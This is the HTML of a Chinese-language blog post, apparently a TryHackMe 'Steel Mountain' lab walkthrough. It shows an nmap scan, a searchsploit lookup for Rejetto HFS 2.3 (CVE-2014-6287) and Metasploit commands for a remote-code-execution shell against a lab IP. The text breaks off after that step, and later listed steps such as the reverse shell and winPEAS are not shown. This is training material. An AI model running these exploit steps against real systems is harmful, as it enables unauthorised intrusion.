@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>TryHackMe -- Steal Mountain - V4ler1an</title><meta name="Description" content="THM学习训练记录"><meta property="og:title" content="TryHackMe -- Steal Mountain" />
+<meta property="og:description" content="THM学习训练记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/thm-steal_mountain/thm.jpeg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-04T07:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-04T08:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/thm-steal_mountain/thm.jpeg" /><meta name="twitter:title" content="TryHackMe -- Steal Mountain"/>
+<meta name="twitter:description" content="THM学习训练记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/thm-steal_mountain/" /><link rel="prev" href="https://www.v4ler1an.com/2024/01/thm-kenobi/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TryHackMe -- Steal Mountain",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-steal_mountain\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-steal_mountain\/thm.jpeg",
+                            "width":  1300 ,
+                            "height":  620 
+                        }],"genre": "posts","keywords": "THM","wordcount":  1867 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/thm-steal_mountain\/","datePublished": "2024-01-04T07:57:40+08:00","dateModified": "2024-01-04T08:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "THM学习训练记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/thm-steal_mountain/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/thm-steal_mountain/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">TryHackMe -- Steal Mountain</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-04">2024-01-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1867 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id="/2024/01/thm-steal_mountain/" class="leancloud_visitors" data-flag-title="TryHackMe -- Steal Mountain">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/thm-steal_mountain/thm.jpeg"
+        data-srcset="/2024/01/thm-steal_mountain/thm.jpeg, /2024/01/thm-steal_mountain/thm.jpeg 1.5x, /2024/01/thm-steal_mountain/thm.jpeg 2x"
+        data-sizes="auto"
+        alt="/2024/01/thm-steal_mountain/thm.jpeg"
+        title="THM学习训练记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#who-is-the-employee-of-the-month">Who is the employee of the month?</a></li>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#scan-the-machine-with-nmap-what-is-the-other-port-running-a-web-server-on">Scan the machine with nmap. What is the other port running a web server on?</a></li>
+        <li><a href="#take-a-look-at-the-other-web-server-what-file-server-is-running">Take a look at the other web server. What file server is running?</a></li>
+        <li><a href="#what-is-the-cve-number-to-exploit-this-file-server">What is the CVE number to exploit this file server?</a></li>
+        <li><a href="#use-metasploit-to-get-an-initial-shell-what-is-the-user-flag">Use Metasploit to get an initial shell. What is the user flag?</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#what-is-the-name-of-the-service-which-shows-up-as-an-unquoted-service-path-vulnerability">What is the name of the service which shows up as an <em>unquoted service path</em> vulnerability?</a></li>
+        <li><a href="#what-is-the-root-flag">What is the root flag?</a></li>
+      </ul>
+    </li>
+    <li><a href="#access-and-escalation-without-metasploit">Access and Escalation without Metasploit</a>
+      <ul>
+        <li><a href="#1-下载exp">1. 下载exp</a></li>
+        <li><a href="#2-修改portip">2. 修改port/ip</a></li>
+        <li><a href="#3-开启一个web-server上传一个netcatexe">3. 开启一个web server，上传一个netcat.exe</a></li>
+        <li><a href="#4-开启web-server监听端口">4. 开启web server，监听端口</a></li>
+        <li><a href="#5-运行exp获取反弹shell">5. 运行exp，获取反弹shell</a></li>
+        <li><a href="#6-使用winpeas">6. 使用winPEAS</a></li>
+        <li><a href="#7-运行winpeas发现弱点">7. 运行winPEAS，发现弱点</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Steal Mountain Walkthrough.</p>
+<h1 id="thm---steal-mountain">THM - Steal Mountain</h1>
+<h2 id="who-is-the-employee-of-the-month">Who is the employee of the month?</h2>
+<p>首先全端口服务和脚本扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -T4 -sC -sV -oN nmap.out -p- 10.10.33.145
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-06 01:43 EST
+</span></span><span class="line"><span class="cl">Warning: 10.10.33.145 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>10.10.33.145<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.35s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65514</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE            VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open     http               Microsoft IIS httpd 8.5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/8.5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">135/tcp   open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open     microsoft-ds       Microsoft Windows Server <span class="m">2008</span> R2 - <span class="m">2012</span> microsoft-ds
+</span></span><span class="line"><span class="cl">3365/tcp  filtered contentserver
+</span></span><span class="line"><span class="cl">3389/tcp  open     ssl/ms-wbt-server?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>steelmountain
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2024-03-05T06:42:04
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-09-04T06:42:04
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: STEELMOUNTAIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: STEELMOUNTAIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: STEELMOUNTAIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: steelmountain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: steelmountain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 6.3.9600
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2024-03-06T07:14:09+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2024-03-06T07:14:16+00:00<span class="p">;</span> -1s from scanner time.
+</span></span><span class="line"><span class="cl">5985/tcp  open     http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">8080/tcp  open     http               HttpFileServer httpd 2.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HFS /
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: HFS 2.3
+</span></span><span class="line"><span class="cl">47001/tcp open     http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">48566/tcp filtered unknown
+</span></span><span class="line"><span class="cl">48982/tcp filtered unknown
+</span></span><span class="line"><span class="cl">49152/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49153/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49154/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49155/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49156/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49169/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49170/tcp open     msrpc              Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">51012/tcp filtered unknown
+</span></span><span class="line"><span class="cl">57482/tcp filtered unknown
+</span></span><span class="line"><span class="cl">60236/tcp filtered unknown
+</span></span><span class="line"><span class="cl">Service Info: OSs: Windows, Windows Server <span class="m">2008</span> R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:0:2:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:79:9d:b1:65:7b <span class="o">(</span>unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-03-06T07:14:08
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2024-03-06T06:41:55
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1871.24 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开了80端口，139/445端口。先看80端口：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061538798.png"
+        title="image-20240306153824756" /></p>
+<p>只有一张图片，看下源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Steel Mountain<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="p">{</span><span class="k">font-family</span><span class="p">:</span> <span class="n">Arial</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.html&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/img/logo.png&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;width:500px;height:300px;&#34;</span><span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Employee of the month<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/img/BillHarper.png&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;width:200px;height:200px;&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现图片的名字，BillHarper。</p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="scan-the-machine-with-nmap-what-is-the-other-port-running-a-web-server-on">Scan the machine with nmap. What is the other port running a web server on?</h3>
+<p>另外一个跑web服务的端口：8080</p>
+<h3 id="take-a-look-at-the-other-web-server-what-file-server-is-running">Take a look at the other web server. What file server is running?</h3>
+<p>看一下8080端口，文件服务器：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061546807.png"
+        title="image-20240306154658769" /></p>
+<p>Rejetto HTTP File Server</p>
+<h3 id="what-is-the-cve-number-to-exploit-this-file-server">What is the CVE number to exploit this file server?</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit rejetto <span class="p">|</span> grep 2.3
+</span></span><span class="line"><span class="cl">Rejetto HttpFileServer 2.3.x - Remote Command Execution <span class="o">(</span>3<span class="o">)</span>                                                                              <span class="p">|</span> windows/webapps/49125.py
+</span></span><span class="line"><span class="cl">Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.2/2.3 - Arbitrary File Upload                                                                           <span class="p">|</span> multiple/remote/30850.txt
+</span></span><span class="line"><span class="cl">Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3a/2.3b/2.3c - Remote Command Execution                                                                 <span class="p">|</span> windows/webapps/34852.txt
+</span></span><span class="line"><span class="cl">Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3.x - Remote Command Execution <span class="o">(</span>1<span class="o">)</span>                                                                      <span class="p">|</span> windows/remote/34668.txt
+</span></span><span class="line"><span class="cl">Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3.x - Remote Command Execution <span class="o">(</span>2<span class="o">)</span>                                                                      <span class="p">|</span> windows/remote/39161.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -p <span class="m">39161</span>
+</span></span><span class="line"><span class="cl">  Exploit: Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3.x - Remote Command Execution <span class="o">(</span>2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/39161
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
+</span></span><span class="line"><span class="cl">    Codes: CVE-2014-6287, OSVDB-111386
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable, with very long lines <span class="o">(</span>540<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>CVE-2014-6287</p>
+<h3 id="use-metasploit-to-get-an-initial-shell-what-is-the-user-flag">Use Metasploit to get an initial shell. What is the user flag?</h3>
+<p>使用msf：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; search 2014-6287
+</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">0</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> &gt; <span class="nb">set</span> rhost 10.10.33.145
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> &gt; <span class="nb">set</span> rport <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403061606715.png"
